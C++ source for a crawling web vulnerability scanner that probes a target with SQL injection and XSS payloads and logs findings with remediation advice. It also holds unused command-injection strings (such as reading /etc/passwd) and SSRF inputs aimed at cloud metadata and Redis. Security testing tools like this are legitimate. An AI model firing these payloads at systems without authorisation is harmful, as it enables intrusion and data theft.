#include <iostream>
#include <string>
#include <vector>
#include <queue>
#include <set>
#include <map>
#include <mutex>
#include <thread>
#include <chrono>
#include <regex>
#include <curl/curl.h>
#include <boost/asio.hpp>
#include <boost/property_tree/ptree.hpp>
#include <boost/property_tree/json_parser.hpp>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <sqlite3.h>

namespace chrono = std::chrono;
using boost::asio::ip::tcp;
namespace pt = boost::property_tree;

// Forward declarations
class VulnerabilityScanner;
class WebCrawler;
class PayloadGenerator;
class Reporter;

// Vulnerability types
enum class VulnType {
    SQL_INJECTION,
    XSS,
    CSRF,
    FILE_INCLUSION,
    COMMAND_INJECTION,
    SSRF,
    XXE,
    DESERIALIZATION
};

// Vulnerability severity levels
enum class Severity {
    LOW,
    MEDIUM,
    HIGH,
    CRITICAL
};

// Structure to hold vulnerability information
struct Vulnerability {
    VulnType type;
    Severity severity;
    std::string url;
    std::string parameter;
    std::string description;
    std::string payload;
    std::string remediation;
    chrono::system_clock::time_point timestamp;
};

// Structure for HTTP response
struct HttpResponse {
    int status_code;
    std::map<std::string, std::string> headers;
    std::string body;
};

// Callback function for CURL
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp) {
    userp->append((char*)contents, size * nmemb);
    return size * nmemb;
}

class PayloadGenerator {
public:
    static std::vector<std::string> getSqlInjectionPayloads() {
        return {
            "' OR '1'='1",
            "' UNION SELECT NULL,NULL--",
            "' WAITFOR DELAY '0:0:10'--",
            "')) OR '1'='1'--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
        };
    }

    static std::vector<std::string> getXssPayloads() {
        return {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>"
        };
    }

    static std::vector<std::string> getCommandInjectionPayloads() {
        return {
            "; ls -la",
            "| cat /etc/passwd",
            "`whoami`",
            "$(id)",
            "& ping -c 4 127.0.0.1"
        };
    }

    static std::vector<std::string> getSsrfPayloads() {
        return {
            "http://localhost:8080",
            "file:///etc/passwd",
            "http://169.254.169.254/latest/meta-data/",
            "gopher://127.0.0.1:6379/_SET%20mykey%20myvalue",
            "dict://localhost:11211/stats"
        };
    }
};

class WebCrawler {
private:
    std::set<std::string> visited_urls;
    std::queue<std::string> url_queue;
    std::mutex mtx;
    CURL* curl;
    
    bool isValidUrl(const std::string& url) {
        std::regex url_regex(
            R"(https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*))"
        );
        return std::regex_match(url, url_regex);
    }

    std::vector<std::string> extractUrls(const std::string& html) {
        std::vector<std::string> urls;
        std::regex url_regex(R"(<a[^>]+href=["']([^"']+)["'])");
        
        auto urls_begin = std::sregex_iterator(html.begin(), html.end(), url_regex);
        auto urls_end = std::sregex_iterator();

        for (auto i = urls_begin; i != urls_end; ++i) {
            std::string url = (*i)[1];
            if (isValidUrl(url)) {
                urls.push_back(url);
            }
        }
        return urls;
    }

public:
    WebCrawler() {
        curl = curl_easy_init();
        if (!curl) {
            throw std::runtime_error("Failed to initialize CURL");
        }
    }

    ~WebCrawler() {
        if (curl) {
            curl_easy_cleanup(curl);
        }
    }

    std::vector<std::string> crawl(const std::string& start_url, int max_depth = 3) {
        std::vector<std::string> discovered_urls;
        url_queue.push(start_url);
        visited_urls.insert(start_url);

        while (!url_queue.empty() && max_depth > 0) {
            size_t level_size = url_queue.size();
            
            for (size_t i = 0; i < level_size; ++i) {
                std::string current_url = url_queue.front();
                url_queue.pop();
                
                std::string response_body;
                curl_easy_setopt(curl, CURLOPT_URL, current_url.c_str());
                curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
                curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_body);
                
                if (curl_easy_perform(curl) == CURLE_OK) {
                    std::vector<std::string> new_urls = extractUrls(response_body);
                    
                    std::lock_guard<std::mutex> lock(mtx);
                    for (const auto& url : new_urls) {
                        if (visited_urls.find(url) == visited_urls.end()) {
                            visited_urls.insert(url);
                            url_queue.push(url);
                            discovered_urls.push_back(url);
                        }
                    }
                }
            }
            max_depth--;
        }
        return discovered_urls;
    }
};

class Reporter {
private:
    sqlite3* db;
    std::mutex db_mutex;

    void initDatabase() {
        const char* create_table_sql = 
            "CREATE TABLE IF NOT EXISTS vulnerabilities ("
            "id INTEGER PRIMARY KEY AUTOINCREMENT,"
            "type TEXT,"
            "severity TEXT,"
            "url TEXT,"
            "parameter TEXT,"
            "description TEXT,"
            "payload TEXT,"
            "remediation TEXT,"
            "timestamp DATETIME DEFAULT CURRENT_TIMESTAMP"
            ");";

        char* err_msg = nullptr;
        if (sqlite3_exec(db, create_table_sql, nullptr, nullptr, &err_msg) != SQLITE_OK) {
            std::string error = err_msg;
            sqlite3_free(err_msg);
            throw std::runtime_error("Failed to create table: " + error);
        }
    }

public:
    Reporter(const std::string& db_path) {
        if (sqlite3_open(db_path.c_str(), &db) != SQLITE_OK) {
            throw std::runtime_error("Failed to open database");
        }
        initDatabase();
    }

    ~Reporter() {
        if (db) {
            sqlite3_close(db);
        }
    }

    void addVulnerability(const Vulnerability& vuln) {
        std::lock_guard<std::mutex> lock(db_mutex);
        
        const char* insert_sql = 
            "INSERT INTO vulnerabilities (type, severity, url, parameter, description, payload, remediation) "
            "VALUES (?, ?, ?, ?, ?, ?, ?);";

        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, insert_sql, -1, &stmt, nullptr) != SQLITE_OK) {
            throw std::runtime_error("Failed to prepare statement");
        }

        std::string vuln_type;
        switch (vuln.type) {
            case VulnType::SQL_INJECTION: vuln_type = "SQL_INJECTION"; break;
            case VulnType::XSS: vuln_type = "XSS"; break;
            case VulnType::CSRF: vuln_type = "CSRF"; break;
            default: vuln_type = "UNKNOWN"; break;
        }

        std::string severity;
        switch (vuln.severity) {
            case Severity::LOW: severity = "LOW"; break;
            case Severity::MEDIUM: severity = "MEDIUM"; break;
            case Severity::HIGH: severity = "HIGH"; break;
            case Severity::CRITICAL: severity = "CRITICAL"; break;
        }

        sqlite3_bind_text(stmt, 1, vuln_type.c_str(), -1, SQLITE_STATIC);
        sqlite3_bind_text(stmt, 2, severity.c_str(), -1, SQLITE_STATIC);
        sqlite3_bind_text(stmt, 3, vuln.url.c_str(), -1, SQLITE_STATIC);
        sqlite3_bind_text(stmt, 4, vuln.parameter.c_str(), -1, SQLITE_STATIC);
        sqlite3_bind_text(stmt, 5, vuln.description.c_str(), -1, SQLITE_STATIC);
        sqlite3_bind_text(stmt, 6, vuln.payload.c_str(), -1, SQLITE_STATIC);
        sqlite3_bind_text(stmt, 7, vuln.remediation.c_str(), -1, SQLITE_STATIC);

        if (sqlite3_step(stmt) != SQLITE_DONE) {
            sqlite3_finalize(stmt);
            throw std::runtime_error("Failed to insert vulnerability");
        }

        sqlite3_finalize(stmt);
    }

    void generateReport(const std::string& output_path) {
        std::lock_guard<std::mutex> lock(db_mutex);
        
        pt::ptree root;
        pt::ptree vulns_array;

        const char* select_sql = "SELECT * FROM vulnerabilities;";
        sqlite3_stmt* stmt;
        
        if (sqlite3_prepare_v2(db, select_sql, -1, &stmt, nullptr) != SQLITE_OK) {
            throw std::runtime_error("Failed to prepare select statement");
        }

        while (sqlite3_step(stmt) == SQLITE_ROW) {
            pt::ptree vuln;
            vuln.put("type", sqlite3_column_text(stmt, 1));
            vuln.put("severity", sqlite3_column_text(stmt, 2));
            vuln.put("url", sqlite3_column_text(stmt, 3));
            vuln.put("parameter", sqlite3_column_text(stmt, 4));
            vuln.put("description", sqlite3_column_text(stmt, 5));
            vuln.put("payload", sqlite3_column_text(stmt, 6));
            vuln.put("remediation", sqlite3_column_text(stmt, 7));
            vuln.put("timestamp", sqlite3_column_text(stmt, 8));
            
            vulns_array.push_back(std::make_pair("", vuln));
        }

        sqlite3_finalize(stmt);

        root.add_child("vulnerabilities", vulns_array);
        pt::write_json(output_path, root);
    }
};

class VulnerabilityScanner {
private:
    WebCrawler crawler;
    Reporter reporter;
    std::vector<std::thread> threads;
    std::mutex scan_mutex;
    
    bool detectSqlInjection(const std::string& url, const std::string& parameter, const std::string& payload) {
        CURL* curl = curl_easy_init();
        if (!curl) return false;

        std::string response_body;
        std::string test_url = url + "?" + parameter + "=" + payload;
        
        curl_easy_setopt(curl, CURLOPT_URL, test_url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_body);
        
        bool vulnerable = false;
        if (curl_easy_perform(curl) == CURLE_OK) {
            // Check for SQL error messages or unexpected behavior
            std::vector<std::string> error_patterns = {
                "SQL syntax",
                "mysql_fetch",
                "ORA-",
                "PostgreSQL",
                "SQLite3::"
            };
            
            for (const auto& pattern : error_patterns) {
                if (response_body.find(pattern) != std::string::npos) {
                    vulnerable = true;
                    break;
                }
            }
        }
        
        curl_easy_cleanup(curl);
        return vulnerable;
    }
    
    bool detectXss(const std::string& url, const std::string& parameter, const std::string& payload) {
        CURL* curl = curl_easy_init();
        if (!curl) return false;

        std::string response_body;
        std::string test_url = url + "?" + parameter + "=" + payload;
        
        curl_easy_setopt(curl, CURLOPT_URL, test_url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_body);
        
        bool vulnerable = false;
        if (curl_easy_perform(curl) == CURLE_OK) {
            // Check if the payload is reflected in the response
            if (response_body.find(payload) != std::string::npos) {
                vulnerable = true;
            }
        }
        
        curl_easy_cleanup(curl);
        return vulnerable;
    }
    
    void scanUrl(const std::string& url) {
        // Test for SQL Injection
        for (const auto& payload : PayloadGenerator::getSqlInjectionPayloads()) {
            std::vector<std::string> parameters = {"id", "user", "search", "query"};
            for (const auto& param : parameters) {
                if (detectSqlInjection(url, param, payload)) {
                    Vulnerability vuln{
                        VulnType::SQL_INJECTION,
                        Severity::HIGH,
                        url,
                        param,
                        "SQL Injection vulnerability detected",
                        payload,
                        "Use prepared statements and input validation"
                    };
                    reporter.addVulnerability(vuln);
                }
            }
        }
        
        // Test for XSS
        for (const auto& payload : PayloadGenerator::getXssPayloads()) {
            std::vector<std::string> parameters = {"message", "comment", "name", "input"};
            for (const auto& param : parameters) {
                if (detectXss(url, param, payload)) {
                    Vulnerability vuln{
                        VulnType::XSS,
                        Severity::MEDIUM,
                        url,
                        param,
                        "Cross-site Scripting vulnerability detected",
                        payload,
                        "Implement proper output encoding and CSP"
                    };
                    reporter.addVulnerability(vuln);
                }
            }
        }
    }

public:
    VulnerabilityScanner(const std::string& db_path) : reporter(db_path) {}

    void scan(const std::string& target_url, int thread_count = 4) {
        std::vector<std::string> urls = crawler.crawl(target_url);
        
        // Create thread pool
        for (int i = 0; i < thread_count; ++i) {
            threads.emplace_back([this, &urls]() {
                while (true) {
                    std::string url;
                    {
                        std::lock_guard<std::mutex> lock(scan_mutex);
                        if (urls.empty()) break;
                        url = urls.back();
                        urls.pop_back();
                    }
                    scanUrl(url);
                }
            });
        }
        
        // Wait for all threads to complete
        for (auto& thread : threads) {
            thread.join();
        }
    }

    void generateReport(const std::string& output_path) {
        reporter.generateReport(output_path);
    }
};

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " <target_url> [thread_count]" << std::endl;
        return 1;
    }

    std::string target_url = argv[1];
    int thread_count = (argc > 2) ? std::stoi(argv[2]) : 4;

    try {
        // Initialize SSL for HTTPS support
        SSL_library_init();
        SSL_load_error_strings();
        OpenSSL_add_all_algorithms();

        // Initialize CURL
        curl_global_init(CURL_GLOBAL_DEFAULT);

        VulnerabilityScanner scanner("vulnerabilities.db");
        
        std::cout << "Starting vulnerability scan on " << target_url << std::endl;
        std::cout << "Using " << thread_count << " threads" << std::endl;
        
        auto start_time = chrono::high_resolution_clock::now();
        
        scanner.scan(target_url, thread_count);
        scanner.generateReport("vulnerability_report.json");
        
        auto end_time = chrono::high_resolution_clock::now();
        auto duration = chrono::duration_cast<chrono::seconds>(end_time - start_time);
        
        std::cout << "Scan completed in " << duration.count() << " seconds" << std::endl;
        std::cout << "Report generated: vulnerability_report.json" << std::endl;

        // Cleanup
        curl_global_cleanup();
        EVP_cleanup();
        ERR_free_strings();

    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}
